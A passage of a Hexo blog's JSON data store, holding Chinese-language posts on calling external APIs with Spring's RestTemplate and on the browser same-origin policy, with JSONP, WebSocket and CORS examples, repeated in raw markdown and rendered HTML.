class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try &#123;</span><br><span class=\"line\">           String url = &quot;http://xxxxx&quot;;</span><br><span class=\"line\">           //设置ContentType</span><br><span class=\"line\">           HttpHeaders httpHeaders = new HttpHeaders();</span><br><span class=\"line\">           MediaType type = MediaType.parseMediaType( &quot;application/x-www-form-urlencoded;charset=utf-8&quot;);</span><br><span class=\"line\">           httpHeaders.setContentType(type);</span><br><span class=\"line\">           //form表单</span><br><span class=\"line\">           MultiValueMap&lt;String, String&gt; paramMap = new LinkedMultiValueMap&lt;String, String&gt;();</span><br><span class=\"line\">           paramMap.add(&quot;number&quot;, deliver.getUserNumber().substring(2));</span><br><span class=\"line\">           paramMap.add(&quot;port&quot;, deliver.getSPNumber());</span><br><span class=\"line\">           paramMap.add(&quot;content&quot;,new String(deliver.getMessageByte(), &quot;UnicodeBigUnmarked&quot;));</span><br><span class=\"line\">           paramMap.add(&quot;time&quot;, df.format(new Date()));</span><br><span class=\"line\">           HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt;(paramMap, httpHeaders);</span><br><span class=\"line\">           //调用回执接口</span><br><span class=\"line\">           String re = restTemplate.postForObject(url, requestEntity, String.class);</span><br><span class=\"line\">       &#125;catch (Exception e)&#123;</span><br><span class=\"line\">         e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure></p>\n","site":{"data":{}},"excerpt":"","more":"<p>因为在代码中需要调用外部的接口，所以使用RestTemplate</p>\n<h6 id=\"1-导入\"><a href=\"#1-导入\" class=\"headerlink\" title=\"1.导入\"></a>1.导入</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;!-- 包含有restTemplate --&gt;</span><br><span class=\"line\">&lt;dependency&gt;</span><br><span class=\"line\">  &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;</span><br><span class=\"line\">  &lt;artifactId&gt;spring-boot-starter-web&lt;/artifactId&gt;</span><br><span class=\"line\">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>\n<h6 id=\"2-完成配置类\"><a href=\"#2-完成配置类\" class=\"headerlink\" title=\"2.完成配置类\"></a>2.完成配置类</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@Configuration</span><br><span class=\"line\">public class RestTemplateConfig &#123;</span><br><span class=\"line\">  //因为在普通类中使用它，所以给Bean去个名字，方便getBean()导入</span><br><span class=\"line\">\t@Bean(name = &quot;RestTemplate&quot;)</span><br><span class=\"line\">\tpublic RestTemplate restTemplate(ClientHttpRequestFactory factory)&#123;</span><br><span class=\"line\">\t\treturn new RestTemplate(factory);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t@Bean</span><br><span class=\"line\">\tpublic ClientHttpRequestFactory simpleClientHttpRequestFactory()&#123;</span><br><span class=\"line\">\t\tSimpleClientHttpRequestFactory factory=new SimpleClientHttpRequestFactory();</span><br><span class=\"line\">\t\tfactory.setConnectTimeout(15000);</span><br><span class=\"line\">\t\tfactory.setReadTimeout(5000);</span><br><span class=\"line\">\t\treturn factory;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h6 id=\"3-使用\"><a href=\"#3-使用\" class=\"headerlink\" title=\"3.使用\"></a>3.使用</h6><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public class AcceptDeal extends Thread &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">  //通过名字导入</span><br><span class=\"line\">\tRestTemplate restTemplate = (RestTemplate) SpringUtil.getBean(&quot;RestTemplate&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">\t//回执接口</span><br><span class=\"line\">\tString url = &quot;url&quot; + &quot;/&quot; + report.getState();</span><br><span class=\"line\">\trestTemplate.getForEntity(&quot;url&quot;, String.class);</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>设置header与发送接收类型<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">try &#123;</span><br><span class=\"line\">           String url = &quot;http://xxxxx&quot;;</span><br><span class=\"line\">           //设置ContentType</span><br><span class=\"line\">           HttpHeaders httpHeaders = new HttpHeaders();</span><br><span class=\"line\">           MediaType type = MediaType.parseMediaType( &quot;application/x-www-form-urlencoded;charset=utf-8&quot;);</span><br><span class=\"line\">           httpHeaders.setContentType(type);</span><br><span class=\"line\">           //form表单</span><br><span class=\"line\">           MultiValueMap&lt;String, String&gt; paramMap = new LinkedMultiValueMap&lt;String, String&gt;();</span><br><span class=\"line\">           paramMap.add(&quot;number&quot;, deliver.getUserNumber().substring(2));</span><br><span class=\"line\">           paramMap.add(&quot;port&quot;, deliver.getSPNumber());</span><br><span class=\"line\">           paramMap.add(&quot;content&quot;,new String(deliver.getMessageByte(), &quot;UnicodeBigUnmarked&quot;));</span><br><span class=\"line\">           paramMap.add(&quot;time&quot;, df.format(new Date()));</span><br><span class=\"line\">           HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt; requestEntity = new HttpEntity&lt;MultiValueMap&lt;String, String&gt;&gt;(paramMap, httpHeaders);</span><br><span class=\"line\">           //调用回执接口</span><br><span class=\"line\">           String re = restTemplate.postForObject(url, requestEntity, String.class);</span><br><span class=\"line\">       &#125;catch (Exception e)&#123;</span><br><span class=\"line\">         e.printStackTrace();</span><br><span class=\"line\">       &#125;</span><br></pre></td></tr></table></figure></p>\n"},{"title":"浏览器同源策略","date":"2019-10-15T01:16:55.000Z","_content":"\n# 一.什么是同源策略\n\n首先，同源策略是浏览器端的，不存在于安卓，ios,node或java等其他环境.\n\n## 1.什么是同源\n\n![origin](http://67.216.218.49:8000/file/blogs/base/origin_01.png)\n\n即,协议,ip，port 共同构成源.\n\n## 2.同源协议内容\n\n- (1).不能读取非同源的Cookie,LocalStorage,IndexDB\n\n- (2).不能获取非同源的DOM,Window\n\n- (3).跨域AJAX请求返回不能接收，被浏览器拦截\n\n## 3.一些可以跨域\n\n- Form表单\n\nform表单提交，一般会进行页面跳转\n\n- \\<image>,\\<a>,\\<script>,\\<iframe>等拥有的src，href属性可以跨域\n\n在127.0.0.1的地址的页面中，可以用iframe加载baidu.com的页面，但是不能读取baidu.com中的内容(window对象和document对象),但是如果加载自己域名下其他页面(同源)，是可以读取的\n\n\n\n\n# 二.为什么\n\n## 1.为什么需要同源策略\n\n反证：如果没有同源策略会怎样?\n\n如果没有同源策略，一个页面可以任意读取其它页面的信息(页面内容，cookie等)，不用说都知道这样肯定不行。会导致CSRF等.\n\n\n# 三.怎么解决\n\n## 1.JSONP\n\njsonp实现跨域是因为\\<script>,所以，它也只能发get请求，毕竟从没见过post方式的\\<script>\n\n```\nfunction addScriptTag(src) {  \n  var script = document.createElement('script');  \n  script.setAttribute(\"type\",\"text/javascript\");  \n  script.src = src;  \n  document.body.appendChild(script);  \n}\nwindow.onload = function () {  \n  addScriptTag('http://example.com/ip?callback=foo');  \n}\nfunction foo(data) {  \n  console.log('Your public IP address is: ' + data.ip);  \n};\n```\n\n## 2.WebSocket\n\n首先WebSocket是一个协议.WebSocket 可以由服务端主动向客户端推送消息，是双全工方式。<br>\n而http，只能由客户端发起，是单向请求。<br>\n\n具体可看:https://www.ruanyifeng.com/blog/2017/05/websocket.html\n\n## 3.CORS\n\n(原文) http://www.ruanyifeng.com/blog/2016/04/cors.html\n\nCross-origin resource sharing(跨域资源共享),是一个W3C标准，需要浏览器和服务器同时支持,目前浏览器都已支持，服务器端需进行配置.<br>\n\nCORS请求分为简单请求和非简单请求。<br>\n\n### 3.1 简单请求\n\n#### 3.1.1 特征\n\n - 请求方式\n\n 请求方式为 HEAD,GET,POST\n\n - header信息\n\n header信息不超出以下范围：\n ```\n Accept\n Accept-Language\n Content-Language\n Last-Event-ID\n Content-Type：\n         application/x-www-form-urlencoded、 multipart/form-data、text/plain\n ```\n 一般主要是看Content-Type, 比如Content-Type: application/json 为复杂请求\n\n\n\n #### 3.1.2 请求流程\n\n\n 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。\n 如：\n ```\nGET /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n ```\n\n 如果 Origin 不在许可的范围内，浏览器会返回一个正常的HTTP响应，但是响应头中不包含Access-Control-Allow-Origin信息，此时浏览器就知道出错了。\n\n 如果 Origin 在许可的范围内，服务器返回会多出几个头信息。\n ```\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Expose-Headers: FooBar\n ```\n\n ### 3.2 非简单请求\n\n超出简单请求范围的请求。<br>\n\n如请求方式为PUT,DELETE, header包含Cookie， Content-Type为 application/json 等。\n\n非简单请求浏览器会先发送一个 OPTION 类型的预检请求，向服务器确认是否可以跨域。\n\n```\nOPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: X-Custom-Header\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n\n服务器收到预检请求后，检查Cors的相关信息，如果确认允许，则返回允许的信息，浏览器再发送真正请求，带上Origin字段。\n\n```\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: X-Custom-Header\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n```\n\n```\nPUT /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nX-Custom-Header: value\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n\n如果预检信息不通过，则服务器返回的不带Cors相关信息。\n浏览器根据Cors相关信息来确定是否允许跨域。\n","source":"_posts/base/浏览器同源策略.md","raw":"---\ntitle: 浏览器同源策略\ndate: 2019-10-14 21:16:55\ntags: [base]\n---\n\n# 一.什么是同源策略\n\n首先，同源策略是浏览器端的，不存在于安卓，ios,node或java等其他环境.\n\n## 1.什么是同源\n\n![origin](http://67.216.218.49:8000/file/blogs/base/origin_01.png)\n\n即,协议,ip，port 共同构成源.\n\n## 2.同源协议内容\n\n- (1).不能读取非同源的Cookie,LocalStorage,IndexDB\n\n- (2).不能获取非同源的DOM,Window\n\n- (3).跨域AJAX请求返回不能接收，被浏览器拦截\n\n## 3.一些可以跨域\n\n- Form表单\n\nform表单提交，一般会进行页面跳转\n\n- \\<image>,\\<a>,\\<script>,\\<iframe>等拥有的src，href属性可以跨域\n\n在127.0.0.1的地址的页面中，可以用iframe加载baidu.com的页面，但是不能读取baidu.com中的内容(window对象和document对象),但是如果加载自己域名下其他页面(同源)，是可以读取的\n\n\n\n\n# 二.为什么\n\n## 1.为什么需要同源策略\n\n反证：如果没有同源策略会怎样?\n\n如果没有同源策略，一个页面可以任意读取其它页面的信息(页面内容，cookie等)，不用说都知道这样肯定不行。会导致CSRF等.\n\n\n# 三.怎么解决\n\n## 1.JSONP\n\njsonp实现跨域是因为\\<script>,所以，它也只能发get请求，毕竟从没见过post方式的\\<script>\n\n```\nfunction addScriptTag(src) {  \n  var script = document.createElement('script');  \n  script.setAttribute(\"type\",\"text/javascript\");  \n  script.src = src;  \n  document.body.appendChild(script);  \n}\nwindow.onload = function () {  \n  addScriptTag('http://example.com/ip?callback=foo');  \n}\nfunction foo(data) {  \n  console.log('Your public IP address is: ' + data.ip);  \n};\n```\n\n## 2.WebSocket\n\n首先WebSocket是一个协议.WebSocket 可以由服务端主动向客户端推送消息，是双全工方式。<br>\n而http，只能由客户端发起，是单向请求。<br>\n\n具体可看:https://www.ruanyifeng.com/blog/2017/05/websocket.html\n\n## 3.CORS\n\n(原文) http://www.ruanyifeng.com/blog/2016/04/cors.html\n\nCross-origin resource sharing(跨域资源共享),是一个W3C标准，需要浏览器和服务器同时支持,目前浏览器都已支持，服务器端需进行配置.<br>\n\nCORS请求分为简单请求和非简单请求。<br>\n\n### 3.1 简单请求\n\n#### 3.1.1 特征\n\n - 请求方式\n\n 请求方式为 HEAD,GET,POST\n\n - header信息\n\n header信息不超出以下范围：\n ```\n Accept\n Accept-Language\n Content-Language\n Last-Event-ID\n Content-Type：\n         application/x-www-form-urlencoded、 multipart/form-data、text/plain\n ```\n 一般主要是看Content-Type, 比如Content-Type: application/json 为复杂请求\n\n\n\n #### 3.1.2 请求流程\n\n\n 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。\n 如：\n ```\nGET /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n ```\n\n 如果 Origin 不在许可的范围内，浏览器会返回一个正常的HTTP响应，但是响应头中不包含Access-Control-Allow-Origin信息，此时浏览器就知道出错了。\n\n 如果 Origin 在许可的范围内，服务器返回会多出几个头信息。\n ```\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Credentials: true\nAccess-Control-Expose-Headers: FooBar\n ```\n\n ### 3.2 非简单请求\n\n超出简单请求范围的请求。<br>\n\n如请求方式为PUT,DELETE, header包含Cookie， Content-Type为 application/json 等。\n\n非简单请求浏览器会先发送一个 OPTION 类型的预检请求，向服务器确认是否可以跨域。\n\n```\nOPTIONS /cors HTTP/1.1\nOrigin: http://api.bob.com\nAccess-Control-Request-Method: PUT\nAccess-Control-Request-Headers: X-Custom-Header\nHost: api.alice.com\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n\n服务器收到预检请求后，检查Cors的相关信息，如果确认允许，则返回允许的信息，浏览器再发送真正请求，带上Origin字段。\n\n```\nHTTP/1.1 200 OK\nDate: Mon, 01 Dec 2008 01:15:39 GMT\nServer: Apache/2.0.61 (Unix)\nAccess-Control-Allow-Origin: http://api.bob.com\nAccess-Control-Allow-Methods: GET, POST, PUT\nAccess-Control-Allow-Headers: X-Custom-Header\nContent-Type: text/html; charset=utf-8\nContent-Encoding: gzip\nContent-Length: 0\nKeep-Alive: timeout=2, max=100\nConnection: Keep-Alive\nContent-Type: text/plain\n```\n\n```\nPUT /cors HTTP/1.1\nOrigin: http://api.bob.com\nHost: api.alice.com\nX-Custom-Header: value\nAccept-Language: en-US\nConnection: keep-alive\nUser-Agent: Mozilla/5.0...\n```\n\n如果预检信息不通过，则服务器返回的不带Cors相关信息。\n浏览器根据Cors相关信息来确定是否允许跨域。\n","slug":"base/浏览器同源策略","published":1,"updated":"2019-10-23T08:41:26.964Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ck23321hf000l6dcpagy0g4la","content":"<h1 id=\"一-什么是同源策略\"><a href=\"#一-什么是同源策略\" class=\"headerlink\" title=\"一.什么是同源策略\"></a>一.什么是同源策略</h1><p>首先，同源策略是浏览器端的，不存在于安卓，ios,node或java等其他环境.</p>\n<h2 id=\"1-什么是同源\"><a href=\"#1-什么是同源\" class=\"headerlink\" title=\"1.什么是同源\"></a>1.什么是同源</h2><p><img src=\"http://67.216.218.49:8000/file/blogs/base/origin_01.png\" alt=\"origin\"></p>\n<p>即,协议,ip，port 共同构成源.</p>\n<h2 id=\"2-同源协议内容\"><a href=\"#2-同源协议内容\" class=\"headerlink\" title=\"2.同源协议内容\"></a>2.同源协议内容</h2><ul>\n<li><p>(1).不能读取非同源的Cookie,LocalStorage,IndexDB</p>\n</li>\n<li><p>(2).不能获取非同源的DOM,Window</p>\n</li>\n<li><p>(3).跨域AJAX请求返回不能接收，被浏览器拦截</p>\n</li>\n</ul>\n<h2 id=\"3-一些可以跨域\"><a href=\"#3-一些可以跨域\" class=\"headerlink\" title=\"3.一些可以跨域\"></a>3.一些可以跨域</h2><ul>\n<li>Form表单</li>\n</ul>\n<p>form表单提交，一般会进行页面跳转</p>\n<ul>\n<li>\\<image>,\\<a>,\\<script>,\\<iframe>等拥有的src，href属性可以跨域</li>\n</ul>\n<p>在127.0.0.1的地址的页面中，可以用iframe加载baidu.com的页面，但是不能读取baidu.com中的内容(window对象和document对象),但是如果加载自己域名下其他页面(同源)，是可以读取的</p>\n<h1 id=\"二-为什么\"><a href=\"#二-为什么\" class=\"headerlink\" title=\"二.为什么\"></a>二.为什么</h1><h2 id=\"1-为什么需要同源策略\"><a href=\"#1-为什么需要同源策略\" class=\"headerlink\" title=\"1.为什么需要同源策略\"></a>1.为什么需要同源策略</h2><p>反证：如果没有同源策略会怎样?</p>\n<p>如果没有同源策略，一个页面可以任意读取其它页面的信息(页面内容，cookie等)，不用说都知道这样肯定不行。会导致CSRF等.</p>\n<h1 id=\"三-怎么解决\"><a href=\"#三-怎么解决\" class=\"headerlink\" title=\"三.怎么解决\"></a>三.怎么解决</h1><h2 id=\"1-JSONP\"><a href=\"#1-JSONP\" class=\"headerlink\" title=\"1.JSONP\"></a>1.JSONP</h2><p>jsonp实现跨域是因为\\<script>,所以，它也只能发get请求，毕竟从没见过post方式的\\<script></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">function addScriptTag(src) &#123;  </span><br><span class=\"line\">  var script = document.createElement(&apos;script&apos;);  </span><br><span class=\"line\">  script.setAttribute(&quot;type&quot;,&quot;text/javascript&quot;);  </span><br><span class=\"line\">  script.src = src;  </span><br><span class=\"line\">  document.body.appendChild(script);  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">window.onload = function () &#123;  </span><br><span class=\"line\">  addScriptTag(&apos;http://example.com/ip?callback=foo&apos;);  </span><br><span class=\"line\">&#125;</span><br><span class=\"line\">function foo(data) &#123;  </span><br><span class=\"line\">  console.log(&apos;Your public IP address is: &apos; + data.ip);  </span><br><span class=\"line\">&#125;;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-WebSocket\"><a href=\"#2-WebSocket\" class=\"headerlink\" title=\"2.WebSocket\"></a>2.WebSocket</h2><p>首先WebSocket是一个协议.WebSocket 可以由服务端主动向客户端推送消息，是双全工方式。<br><br>而http，只能由客户端发起，是单向请求。<br></p>\n<p>具体可看:<a href=\"https://www.ruanyifeng.com/blog/2017/05/websocket.html\">https://www.ruanyifeng.com/blog/2017/05/websocket.html</a></p>\n<h2 id=\"3-CORS\"><a href=\"#3-CORS\" class=\"headerlink\" title=\"3.CORS\"></a>3.CORS</h2><p>(原文) <a href=\"http://www.ruanyifeng.com/blog/2016/04/cors.html\">http://www.ruanyifeng.com/blog/2016/04/cors.html</a></p>\n<p>Cross-origin resource sharing(跨域资源共享),是一个W3C标准，需要浏览器和服务器同时支持,目前浏览器都已支持，服务器端需进行配置.<br></p>\n<p>CORS请求分为简单请求和非简单请求。<br></p>\n<h3 id=\"3-1-简单请求\"><a href=\"#3-1-简单请求\" class=\"headerlink\" title=\"3.1 简单请求\"></a>3.1 简单请求</h3><h4 id=\"3-1-1-特征\"><a href=\"#3-1-1-特征\" class=\"headerlink\" title=\"3.1.1 特征\"></a>3.1.1 特征</h4><ul>\n<li><p>请求方式</p>\n<p>请求方式为 HEAD,GET,POST</p>\n</li>\n<li><p>header信息</p>\n<p>header信息不超出以下范围：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Accept</span><br><span class=\"line\">Accept-Language</span><br><span class=\"line\">Content-Language</span><br><span class=\"line\">Last-Event-ID</span><br><span class=\"line\">Content-Type：</span><br><span class=\"line\">        application/x-www-form-urlencoded、 multipart/form-data、text/plain</span><br></pre></td></tr></table></figure>\n<p>一般主要是看Content-Type, 比如Content-Type: application/json 为复杂请求</p>\n</li>\n</ul>\n<h4 id=\"3-1-2-请求流程\"><a href=\"#3-1-2-请求流程\" class=\"headerlink\" title=\"3.1.2 请求流程\"></a>3.1.2 请求流程</h4><p> 对于简单请求，浏览器直接发出CORS请求。具体来说，就是在头信息之中，增加一个Origin字段。<br> 如：<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">GET /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure></p>\n<p> 如果 Origin 不在许可的范围内，浏览器会返回一个正常的HTTP响应，但是响应头中不包含Access-Control-Allow-Origin信息，此时浏览器就知道出错了。</p>\n<p> 如果 Origin 在许可的范围内，服务器返回会多出几个头信息。<br> <figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Allow-Credentials: true</span><br><span class=\"line\">Access-Control-Expose-Headers: FooBar</span><br></pre></td></tr></table></figure></p>\n<h3 id=\"3-2-非简单请求\"><a href=\"#3-2-非简单请求\" class=\"headerlink\" title=\"3.2 非简单请求\"></a>3.2 非简单请求</h3><p>超出简单请求范围的请求。<br></p>\n<p>如请求方式为PUT,DELETE, header包含Cookie， Content-Type为 application/json 等。</p>\n<p>非简单请求浏览器会先发送一个 OPTION 类型的预检请求，向服务器确认是否可以跨域。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">OPTIONS /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Request-Method: PUT</span><br><span class=\"line\">Access-Control-Request-Headers: X-Custom-Header</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n<p>服务器收到预检请求后，检查Cors的相关信息，如果确认允许，则返回允许的信息，浏览器再发送真正请求，带上Origin字段。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HTTP/1.1 200 OK</span><br><span class=\"line\">Date: Mon, 01 Dec 2008 01:15:39 GMT</span><br><span class=\"line\">Server: Apache/2.0.61 (Unix)</span><br><span class=\"line\">Access-Control-Allow-Origin: http://api.bob.com</span><br><span class=\"line\">Access-Control-Allow-Methods: GET, POST, PUT</span><br><span class=\"line\">Access-Control-Allow-Headers: X-Custom-Header</span><br><span class=\"line\">Content-Type: text/html; charset=utf-8</span><br><span class=\"line\">Content-Encoding: gzip</span><br><span class=\"line\">Content-Length: 0</span><br><span class=\"line\">Keep-Alive: timeout=2, max=100</span><br><span class=\"line\">Connection: Keep-Alive</span><br><span class=\"line\">Content-Type: text/plain</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">PUT /cors HTTP/1.1</span><br><span class=\"line\">Origin: http://api.bob.com</span><br><span class=\"line\">Host: api.alice.com</span><br><span class=\"line\">X-Custom-Header: value</span><br><span class=\"line\">Accept-Language: en-US</span><br><span class=\"line\">Connection: keep-alive</span><br><span class=\"line\">User-Agent: Mozilla/5.0...</span><br></pre></td></tr></table></figure>\n<p>如果预检信息不通过，则服务器返回的不带Cors相关信息。<br>浏览器根据Cors相关信息来确定是否允许跨域。</p>\n</script></a></image></li></ul>","site":{"data":{}},"excerpt":"","more":"<h1 id=\"一-什么是同源策略\"><a href=\"#一-什么是同源策略\" class=\"headerlink\" title=\"一.什么是同源策略\"></a>一.什么是同源策略</h1><p>首先，同源策略是浏览器端的，不存在于安卓，ios,node或java等其他环境.</p>\n<h2 id=\"1-什么是同源\"><a href=\"#1-什么是同源\" class=\"headerlink\" title=\"1.什么是同源\"></a>1.什么是同源</h2><p><img src=\"http://67.216.218.49:8000/file/blogs/base/origin_01.png\" alt=\"origin\"></p>\n<p>即,协议,ip，port 共同构成源.</p>\n<h2 id=\"2-同源协议内容\"><a href=\"#2-同源协议内容\" class=\"headerlink\" title=\"2.同源协议内容\"></a>2.同源协议内容</h2><ul>\n<li><p>(1).不能读取非同源的Cookie,LocalStorage,IndexDB</p>\n</li>\n<li><p>(2).不能获取非同源的DOM,Window</p>\n</li>\n<li><p>(3).跨域AJAX请求返回不能接收，被浏览器拦截</p>\n</li>\n</ul>\n<h2 id=\"3-一些可以跨域\"><a href=\"#3-一些可以跨域\" class=\"headerlink\" title=\"3.一些可以跨域\"></a>3.一些可以跨域</h2><ul>\n<li>Form表单</li>\n</ul>\n<p>form表单提交，一般会进行页面跳转</p>\n<ul>\n<li>\\<image>,\\<a>,\\<script>,\\<iframe>等拥有的src，href属性可以跨域</li>\n</ul>\n<p>在127.0.0.1的地址的页面中，可以用iframe加载baidu.com的页面，但是不能读取baidu.com中的内容(window对象和document对象),但是如果加载自己域名下其他页面(同源)，是可以读取的</p>\n<h1 id=\"二-为什么\"><a href=\"#二-为什么\" class=\"headerlink\" title=\"二.为什么\"></a>二.为什么</h1><h2 id=\"1-为什么需要同源策略\"><a href=\"#1-为什么需要同源策略\" class=\"headerlink\" title=\"1.为什么需要同源策略\"></a>1.为什么需要同源策略</h2><p>反证：如果没有同源策略会怎样?</p>\n<p>如果没有同源策略，一个页面可以任意读取其它页面的信息(页面内容，cookie等)，不用说都知道这样肯定不行。会导致CSRF等.</p>\n<h1 id=\"三-怎么解决\"><a href=\"#三-怎么解决\" class=\"headerlink\" title=\"三.怎么解决\"></a>三.怎么解决</h1><h2 id=\"1-JSONP\"><a href=\"#1-JSONP\" class=\"headerlink\" title=\"1.JSONP\"></a>1.JSONP</h2><p>jsonp实现跨域是因为\\<script>,所以，它也只能发get请求，毕竟从没见过post方式的\\<script></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 